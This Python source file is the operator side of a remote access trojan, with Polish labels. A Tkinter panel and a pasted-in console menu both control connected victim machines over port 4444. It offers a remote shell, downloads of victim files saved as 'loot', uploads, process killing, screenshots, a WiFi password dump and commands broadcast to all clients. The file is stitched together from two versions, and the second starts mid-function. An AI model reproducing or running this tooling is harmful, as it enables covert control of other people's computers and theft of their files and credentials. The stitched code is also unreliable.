import socket
import threading
import os
import time
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from datetime import datetime

HOST = '0.0.0.0'
PORT = 4444

class ServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🖥️ Panel Zarządzania Klientami")
        self.root.geometry("1200x700")
        self.root.configure(bg='#1e1e1e')
        
        self.clients = {}
        self.current_client = None
        
        self.setup_ui()
        self.start_listener()
    
    def setup_ui(self):
        # Górny pasek
        top_frame = tk.Frame(self.root, bg='#2d2d2d', height=50)
        top_frame.pack(fill=tk.X)
        
        tk.Label(top_frame, text="🎯 PANEL ZARZĄDZANIA KLIENTAMI", 
                font=("Arial", 16, "bold"), bg='#2d2d2d', fg='#00ff88').pack(side=tk.LEFT, padx=20, pady=10)
        
        self.status_label = tk.Label(top_frame, text="🔴 Nasłuchiwanie...", 
                                     font=("Arial", 10), bg='#2d2d2d', fg='#ff4444')
        self.status_label.pack(side=tk.RIGHT, padx=20)
        
        # Główny kontener
        main_frame = tk.Frame(self.root, bg='#1e1e1e')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Lewy panel - lista klientów
        left_panel = tk.Frame(main_frame, bg='#252525', width=300)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
        left_panel.pack_propagate(False)
        
        tk.Label(left_panel, text="📡 AKTYWNI KLIENCI", font=("Arial", 12, "bold"),
                bg='#252525', fg='#00bcd4').pack(pady=10)
        
        # Treeview dla klientów
        columns = ('ID', 'IP', 'System')
        self.tree = ttk.Treeview(left_panel, columns=columns, show='headings', height=20)
        self.tree.heading('ID', text='ID')
        self.tree.heading('IP', text='Adres IP')
        self.tree.heading('System', text='System')
        self.tree.column('ID', width=40)
        self.tree.column('IP', width=130)
        self.tree.column('System', width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.tree.bind('<Double-1>', self.on_client_select)
        
        # Prawy panel - akcje
        right_panel = tk.Frame(main_frame, bg='#252525')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Notebook (zakładki)
        self.notebook = ttk.Notebook(right_panel)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Zakładka: Shell
        self.shell_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.notebook.add(self.shell_tab, text='💻 Shell')
        self.setup_shell_tab()
        
        # Zakładka: Pliki
        self.files_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.notebook.add(self.files_tab, text='📁 Pliki')
        self.setup_files_tab()
        
        # Zakładka: Procesy
        self.process_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.notebook.add(self.process_tab, text='⚙️ Procesy')
        self.setup_process_tab()
        
        # Zakładka: Narzędzia
        self.tools_tab = tk.Frame(self.notebook, bg='#1e1e1e')
        self.notebook.add(self.tools_tab, text='🔧 Narzędzia')
        self.setup_tools_tab()
        
        # Dół - logi
        log_frame = tk.Frame(self.root, bg='#1e1e1e', height=150)
        log_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        tk.Label(log_frame, text="📋 LOGI", font=("Arial", 10, "bold"),
                bg='#1e1e1e', fg='#888').pack(anchor=tk.W)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=6, bg='#0d0d0d', fg='#00ff00',
                                                   font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)
    
    def setup_shell_tab(self):
        # Pole komendy
        cmd_frame = tk.Frame(self.shell_tab, bg='#1e1e1e')
        cmd_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(cmd_frame, text="Komenda:", bg='#1e1e1e', fg='#fff').pack(side=tk.LEFT)
        self.cmd_entry = tk.Entry(cmd_frame, bg='#333', fg='#fff', insertbackground='#fff',
                                  font=("Consolas", 11))
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        self.cmd_entry.bind('<Return>', self.execute_command)
        
        tk.Button(cmd_frame, text="▶ Wykonaj", command=self.execute_command,
                 bg='#00bcd4', fg='#000', font=("Arial", 10, "bold")).pack(side=tk.RIGHT)
        
        # Output
        self.shell_output = scrolledtext.ScrolledText(self.shell_tab, bg='#0d0d0d', fg='#00ff00',
                                                      font=("Consolas", 10))
        self.shell_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Szybkie komendy
        quick_frame = tk.Frame(self.shell_tab, bg='#1e1e1e')
        quick_frame.pack(fill=tk.X, padx=10, pady=5)
        
        quick_cmds = [
            ('📋 System Info', 'systeminfo'),
            ('🌐 IP Config', 'ipconfig /all'),
            ('👤 Whoami', 'whoami'),
            ('📂 List Files', 'dir'),
            ('🔍 Task List', 'tasklist'),
            ('🛑 Netstat', 'netstat -an'),
        ]
        
        for text, cmd in quick_cmds:
            btn = tk.Button(quick_frame, text=text, 
                          command=lambda c=cmd: self.quick_command(c),
                          bg='#333', fg='#fff', font=("Arial", 8))
            btn.pack(side=tk.LEFT, padx=2, pady=5)
    
    def setup_files_tab(self):
        # Transfer plików
        transfer_frame = tk.LabelFrame(self.files_tab, text="Transfer plików", 
                                       bg='#1e1e1e', fg='#00bcd4')
        transfer_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Pobieranie
        tk.Label(transfer_frame, text="📥 POBIERZ PLIK Z KLIENTA", font=("Arial", 10, "bold"),
                bg='#1e1e1e', fg='#4caf50').pack(anchor=tk.W, padx=10, pady=5)
        
        dl_frame = tk.Frame(transfer_frame, bg='#1e1e1e')
        dl_frame.pack(fill=tk.X, padx=10)
        
        tk.Label(dl_frame, text="Ścieżka:", bg='#1e1e1e', fg='#fff').pack(side=tk.LEFT)
        self.dl_path = tk.Entry(dl_frame, bg='#333', fg='#fff', width=50)
        self.dl_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        tk.Button(dl_frame, text="📥 Pobierz", command=self.download_file,
                 bg='#4caf50', fg='#fff').pack(side=tk.RIGHT, padx=5)
        
        # Wysyłanie
        tk.Label(transfer_frame, text="📤 WYŚLIJ PLIK DO KLIENTA", font=("Arial", 10, "bold"),
                bg='#1e1e1e', fg='#ff9800').pack(anchor=tk.W, padx=10, pady=5)
        
        ul_frame = tk.Frame(transfer_frame, bg='#1e1e1e')
        ul_frame.pack(fill=tk.X, padx=10)
        
        self.ul_path = tk.Entry(ul_frame, bg='#333', fg='#fff', width=40)
        self.ul_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=10)
        tk.Button(ul_frame, text="📂 Wybierz", command=self.browse_file,
                 bg='#666', fg='#fff').pack(side=tk.LEFT, padx=5)
        tk.Button(ul_frame, text="📤 Wyślij", command=self.upload_file,
                 bg='#ff9800', fg='#fff').pack(side=tk.LEFT, padx=5)
        
        # Lista pobranych plików
        tk.Label(self.files_tab, text="📁 POBRANE PLIKI", font=("Arial", 10, "bold"),
                bg='#1e1e1e', fg='#888').pack(anchor=tk.W, padx=10, pady=(20, 5))
        
        self.files_list = tk.Listbox(self.files_tab, bg='#0d0d0d', fg='#4caf50',
                                     font=("Consolas", 9), height=8)
        self.files_list.pack(fill=tk.X, padx=10, pady=5)
        
        # Odświeżanie listy
        tk.Button(self.files_tab, text="🔄 Odśwież", command=self.refresh_files,
                 bg='#333', fg='#fff').pack(pady=5)
    
    def setup_process_tab(self):
        # Zarządzanie procesami
        proc_frame = tk.Frame(self.process_tab, bg='#1e1e1e')
        proc_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(proc_frame, text="Nazwa procesu (np. notepad.exe):", 
                bg='#1e1e1e', fg='#fff').pack(side=tk.LEFT)
        self.proc_name = tk.Entry(proc_frame, bg='#333', fg='#fff', width=30)
        self.proc_name.pack(side=tk.LEFT, padx=10)
        tk.Button(proc_frame, text="🗑 Zabij proces", command=self.kill_process,
                 bg='#f44336', fg='#fff').pack(side=tk.LEFT, padx=5)
        
        # Lista procesów
        tk.Button(self.process_tab, text="📋 Pobierz listę procesów", 
                 command=lambda: self.quick_command('tasklist'),
                 bg='#333', fg='#fff').pack(pady=10)
        
        self.proc_output = scrolledtext.ScrolledText(self.process_tab, bg='#0d0d0d', fg='#00ff00',
                                                     font=("Consolas", 9), height=15)
        self.proc_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def setup_tools_tab(self):
        # Narzędzia
        tools = [
            ('🌐 Uruchom serwer HTTP', self.start_http_server, '#4caf50'),
            ('📸 Zrób screenshot', self.take_screenshot, '#2196f3'),
            ('🔑 Pobierz hasła WiFi', self.get_wifi_passwords, '#9c27b0'),
            ('📋 Lista zapisanych sieci', self.get_saved_networks, '#ff9800'),
            ('🖥️ Informacje o systemie', self.get_system_info, '#00bcd4'),
        ]
        
        for text, cmd, color in tools:
            btn = tk.Button(self.tools_tab, text=text, command=cmd,
                          bg=color, fg='#fff', font=("Arial", 11, "bold"),
                          width=30, height=2)
            btn.pack(pady=5)
        
        self.tools_output = scrolledtext.ScrolledText(self.tools_tab, bg='#0d0d0d', fg='#00ff00',
                                                      font=("Consolas", 9), height=10)
        self.tools_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def start_listener(self):
        """Uruchom nasłuchiwanie w tle"""
        def listen():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((HOST, PORT))
                s.listen(5)
                self.log(f"Nasłuchiwanie na porcie {PORT}")
                self.status_label.config(text="🟢 Nasłuchiwanie...", fg='#00ff00')
                
                while True:
                    conn, addr = s.accept()
                    threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True).start()
        
        threading.Thread(target=listen, daemon=True).start()
    
    def handle_client(self, conn, addr):
        """Obsługa nowego klienta"""
        try:
            conn.send(b"info")
            time.sleep(0.3)
            response = conn.recv(4096).decode(errors='ignore')
        except:
            response = "Windows"
        
        client_id = len(self.clients) + 1
        self.clients[client_id] = (conn, addr, response.strip())
        
        # Aktualizuj GUI
        self.root.after(0, self.add_client_to_tree, client_id, addr[0], response.strip())
        self.log(f"Nowy klient [{client_id}]: {addr[0]}:{addr[1]} - {response.strip()}")
    
    def add_client_to_tree(self, cid, ip, sys_info):
        self.tree.insert('', 'end', values=(cid, ip, sys_info))
    
    def on_client_select(self, event):
        """Wybór klienta z listy"""
        selected = self.tree.selection()
        if selected:
            values = self.tree.item(selected[0])['values']
            self.current_client = values[0]
            self.log(f"Wybrano klienta [{self.current_client}]")
    
    def execute_command(self, event=None):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta z listy!")
            return
        
        cmd = self.cmd_entry.get()
        if not cmd:
            return
        
        self.shell_output.insert(tk.END, f"\n>>> {cmd}\n")
        response = self.send_recv(self.current_client, cmd)
        self.shell_output.insert(tk.END, response + "\n")
        self.shell_output.see(tk.END)
        self.cmd_entry.delete(0, tk.END)
    
    def quick_command(self, cmd):
        """Szybkie wykonanie komendy"""
        self.cmd_entry.delete(0, tk.END)
        self.cmd_entry.insert(0, cmd)
        self.execute_command()
    
    def send_recv(self, client_id, command, timeout=3):
        """Wyślij komendę i odbierz odpowiedź"""
        if client_id not in self.clients:
            return "Klient nie istnieje"
        
        conn, _, _ = self.clients[client_id]
        try:
            conn.send(command.encode())
            conn.settimeout(timeout)
            response = b""
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
                except socket.timeout:
                    break
            conn.settimeout(None)
            return response.decode(errors='ignore')
        except Exception as e:
            return f"Błąd: {e}"
    
    def download_file(self):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta!")
            return
        
        remote_path = self.dl_path.get()
        if not remote_path:
            return
        
        # Pobierz plik
        filename = os.path.basename(remote_path)
        local_path = f"loot_{filename}"
        
        conn, addr, _ = self.clients[self.current_client]
        conn.send(f"download {remote_path}".encode())
        time.sleep(0.3)
        
        with open(local_path, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                    f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                    break
                f.write(data)
        
        self.log(f"Pobrano: {local_path}")
        self.refresh_files()
    
    def upload_file(self):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta!")
            return
        
        local_path = self.ul_path.get()
        if not local_path or not os.path.isfile(local_path):
            messagebox.showerror("Błąd", "Plik nie istnieje!")
            return
        
        conn, _, _ = self.clients[self.current_client]
        filename = os.path.basename(local_path)
        conn.send(f"upload {filename}".encode())
        time.sleep(0.3)
        
        with open(local_path, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.send(chunk)
        
        time.sleep(0.2)
        conn.send(b'FILE_TRANSFER_COMPLETE')
        self.log(f"Wysłano: {filename}")
    
    def browse_file(self):
        filename = filedialog.askopenfilename()
        if filename:
            self.ul_path.delete(0, tk.END)
            self.ul_path.insert(0, filename)
    
    def refresh_files(self):
        self.files_list.delete(0, tk.END)
        for file in os.listdir('.'):
            if file.startswith('loot_'):
                self.files_list.insert(tk.END, file)
    
    def kill_process(self):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta!")
            return
        
        proc = self.proc_name.get()
        if not proc:
            return
        
        response = self.send_recv(self.current_client, f"kill {proc}")
        self.proc_output.insert(tk.END, response + "\n")
        self.log(f"Zabito proces: {proc}")
    
    def start_http_server(self):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta!")
            return
        
        _, addr, _ = self.clients[self.current_client]
        self.send_recv(self.current_client, "http 8080")
        self.tools_output.insert(tk.END, f"Serwer HTTP: http://{addr[0]}:8080\n")
        messagebox.showinfo("HTTP", f"Serwer uruchomiony!\nhttp://{addr[0]}:8080")
    
    def take_screenshot(self):
        if not self.current_client:
            messagebox.showwarning("Brak klienta", "Wybierz klienta!")
            return
        
        self.send_recv(self.current_client, "screenshot")
        time.sleep(2)
        self.download_file_helper("screenshot.png")
    
    def download_file_helper(self, filename):
        """Pomocnicza funkcja pobierania"""
        if self.current_client not in self.clients:
            return
        
        conn, _, _ = self.clients[self.current_client]
        conn.send(f"download {filename}".encode())
        time.sleep(0.3)
        
        local_path = f"loot_{filename}"
        with open(local_path, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                    f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                    break
                f.write(data)
        self.log(f"Pobrano: {local_path}")
    
    def get_wifi_passwords(self):
        """Pobiera hasła WiFi (Windows)"""
        cmd = 'netsh wlan show profiles | findstr ":" | findstr /v "Profil"'
        self.quick_command(cmd)
    
    def get_saved_networks(self):
        """Lista zapisanych sieci WiFi"""
        self.quick_command('netsh wlan show profiles')
    
    def get_system_info(self):
        """Pełna informacja o systemie"""
        self.quick_command('systeminfo')
    
    def log(self, message):
        """Dodaj wpis do logów"""
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        self.log_text.insert(tk.END, f"{timestamp} {message}\n")
        self.log_text.see(tk.END)

if __name__ == '__main__':
    root = tk.Tk()
    app = ServerGUI(root)
    root.mainloop()        conn.send(command.encode())
        return True
    except:
        print("Błąd wysyłania komendy. Klient prawdopodobnie rozłączony.")
        del clients[client_id]
        return False

def recv_response(conn, timeout=2):
    """Odbiera odpowiedź z timeoutem"""
    conn.settimeout(timeout)
    response = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    except:
        pass
    conn.settimeout(None)
    return response.decode(errors='ignore')

def download_file(client_id, remote_filename):
    """Pobiera plik z klienta"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, addr, _ = clients[client_id]
    try:
        conn.send(f"download {remote_filename}".encode())
        # Odbierz plik
        local_filename = f"loot_{addr[0]}_{os.path.basename(remote_filename)}"
        with open(local_filename, 'wb') as f:
            while True:
                data = conn.recv(4096)
                if data.endswith(b'FILE_TRANSFER_COMPLETE'):
                    f.write(data[:-len(b'FILE_TRANSFER_COMPLETE')])
                    break
                if not data:
                    break
                f.write(data)
        print(f"[+] Pobrano: {local_filename}")
    except Exception as e:
        print(f"Błąd pobierania: {e}")

def upload_file(client_id, local_filename):
    """Wysyła plik do klienta"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, _, _ = clients[client_id]
    if not os.path.isfile(local_filename):
        print("Plik nie istnieje lokalnie.")
        return
    try:
        conn.send(f"upload {os.path.basename(local_filename)}".encode())
        time.sleep(0.5)
        with open(local_filename, 'rb') as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                conn.send(chunk)
        time.sleep(0.2)
        conn.send(b'FILE_TRANSFER_COMPLETE')
        print(f"[+] Wysłano: {local_filename}")
    except Exception as e:
        print(f"Błąd wysyłania: {e}")

def kill_process_on_client(client_id, process_name):
    """Zamyka proces na kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, f"kill {process_name}")
    time.sleep(1)
    conn, _, _ = clients[client_id]
    print(recv_response(conn))

def broadcast_command(command):
    """Wysyła komendę do wszystkich klientów"""
    for cid in list(clients.keys()):
        print(f"\n--- Wynik od klienta [{cid}] ---")
        send_command_to_client(cid, command)
        time.sleep(1)
        conn, _, _ = clients[cid]
        print(recv_response(conn))

def shell_on_client(client_id):
    """Interaktywna powłoka na wybranym kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    conn, addr, _ = clients[client_id]
    print(f"\nPołączono z {addr[0]}:{addr[1]}. Wpisz 'exit', aby wrócić.")
    while True:
        try:
            cmd = input(f"SHELL[{addr[0]}]> ")
            if not cmd:
                continue
            if cmd.lower() == 'exit':
                break
            conn.send(cmd.encode())
            time.sleep(1)
            print(recv_response(conn, timeout=3))
        except KeyboardInterrupt:
            break
        except:
            print("Połączenie przerwane.")
            del clients[client_id]
            break

def start_http_on_client(client_id, port=8080):
    """Uruchamia serwer HTTP na kliencie"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, f"http {port}")
    conn, addr, _ = clients[client_id]
    time.sleep(1)
    print(f"[+] Serwer HTTP uruchomiony na http://{addr[0]}:{port}")
    print("[+] Katalog: C:\\Users\\Public\\Documents")

def screenshot(client_id):
    """Próbuje zrobić screenshot na kliencie (wymaga biblioteki pyautogui)"""
    if client_id not in clients:
        print("Nieprawidłowy ID klienta.")
        return
    send_command_to_client(client_id, "screenshot")
    time.sleep(2)
    download_file(client_id, "screenshot.png")

def handle_new_client(conn, addr):
    """Obsługa nowego klienta w osobnym wątku"""
    # Odbierz informacje o systemie
    conn.send(b"info")
    time.sleep(0.5)
    info = recv_response(conn, timeout=2)
    
    client_id = len(clients) + 1
    clients[client_id] = (conn, addr, info.strip() or "Windows")
    print(f"\n[+] NOWY KLIENT [{client_id}] {addr[0]}:{addr[1]} - {info.strip()}")

def accept_clients():
    """Główny wątek nasłuchujący"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Nasłuchiwanie na porcie {PORT}...")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_new_client, args=(conn, addr), daemon=True).start()

def main_menu():
    """Główne menu serwera"""
    while True:
        banner()
        list_clients()
        print("\n=== MENU ===")
        print("1. Połącz powłoką z klientem")
        print("2. Pobierz plik z klienta")
        print("3. Wyślij plik do klienta")
        print("4. Zamknij proces na kliencie")
        print("5. Uruchom serwer HTTP na kliencie")
        print("6. Zrób screenshot (jeśli obsługiwane)")
        print("7. Wyślij komendę do wszystkich")
        print("8. Wyślij niestandardową komendę do klienta")
        print("0. Wyjście")
        
        choice = input("\nWybierz opcję: ")
        
        if choice == '0':
            print("Do widzenia!")
            os._exit(0)
        
        if not clients:
            print("Brak klientów. Czekam...")
            time.sleep(2)
            continue
        
        if choice == '1':
            cid = int(input("Podaj ID klienta: "))
            shell_on_client(cid)
        
        elif choice == '2':
            cid = int(input("Podaj ID klienta: "))
            fname = input("Ścieżka pliku na kliencie: ")
            download_file(cid, fname)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '3':
            cid = int(input("Podaj ID klienta: "))
            fname = input("Lokalna ścieżka pliku do wysłania: ")
            upload_file(cid, fname)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '4':
            cid = int(input("Podaj ID klienta: "))
            proc = input("Nazwa procesu (np. notepad.exe): ")
            kill_process_on_client(cid, proc)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '5':
            cid = int(input("Podaj ID klienta: "))
            port = input("Port HTTP (domyślnie 8080): ") or "8080"
            start_http_on_client(cid, int(port))
            input("\nEnter, aby kontynuować...")
        
        elif choice == '6':
            cid = int(input("Podaj ID klienta: "))
            screenshot(cid)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '7':
            cmd = input("Komenda do wysłania do wszystkich: ")
            broadcast_command(cmd)
            input("\nEnter, aby kontynuować...")
        
        elif choice == '8':
            cid = int(input("Podaj ID klienta: "))
            cmd = input("Komenda: ")
            send_command_to_client(cid, cmd)
            time.sleep(1)
            conn, _, _ = clients[cid]
            print(recv_response(conn))
            input("\nEnter, aby kontynuować...")
        
        else:
            print("Nieprawidłowa opcja!")
            time.sleep(1)

if __name__ == '__main__':
    # Uruchom nasłuchiwanie w osobnym wątku
    listener_thread = threading.Thread(target=accept_clients, daemon=True)
    listener_thread.start()
    time.sleep(1)
    
    # Uruchom menu główne
    main_menu()
